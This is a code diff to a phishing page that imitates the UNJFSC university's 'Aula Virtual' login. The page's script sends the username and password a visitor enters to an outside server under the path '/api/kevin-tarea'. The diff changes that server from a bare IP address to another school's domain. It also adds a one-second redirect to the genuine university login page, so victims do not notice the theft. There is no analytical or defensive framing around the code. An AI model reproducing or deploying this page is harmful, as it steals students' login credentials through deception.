@@ -7,7 +7,7 @@
 <head>
   <title>Aula Virtual - UNJFSC</title>
   <link rel="icon"
-    href="../../i2.wp.com/unjfsc.edu.pe/wp-content/uploads/2019/12/unjfsc_icon_180e43b.png?fit=32%2C32&amp;ssl=1"
+    href="./unjfsc_icon_180.webp"
     sizes="32x32">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
@@ -393,8 +393,7 @@
 
           </div>
           <div class="col-md-12" id="cargando" style="display:none">
-            <img src="./loader.gif"
-              style="width:90px;height:90px" />
+            <img src="./loader.gif" style="width:90px;height:90px" />
           </div>
           <div class="col-md-6">
             <br>
@@ -418,7 +417,6 @@
 
 <script>
   var button = document.getElementById('btn_guardar');
-
   button.addEventListener('click', function () {
     var username = document.getElementById('username').value;
     var pass = document.getElementById('pass').value;
@@ -430,7 +428,7 @@
 
     document.getElementById('cargando').style.display = 'block'; // Mostrar el loader
 
-    fetch('http://161.132.47.66:3001/api/kevin-tarea', {
+    fetch('https://eliteschool.edu.pe/api/kevin-tarea', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -439,12 +437,18 @@
     })
       .then(response => response.json())
       .then(data => {
-        console.log('Success:', data);
-        document.getElementById('cargando').style.display = 'none'; // Ocultar el loader
+        document.getElementById('cargando').style.display = 'none';
+        document.getElementById('divocultar').style.display = 'block';
+
+
+        setTimeout(() => {
+          window.location.href = 'https://aulafiisi.unjfsc.edu.pe/login_aulavirtual/index_fiisi.php#';
+        }, 1000);
+
       })
       .catch((error) => {
         console.error('Error:', error);
-        document.getElementById('cargando').style.display = 'none'; // Ocultar el loader en caso de error
+        document.getElementById('cargando').style.display = 'none';
       });
   });
 
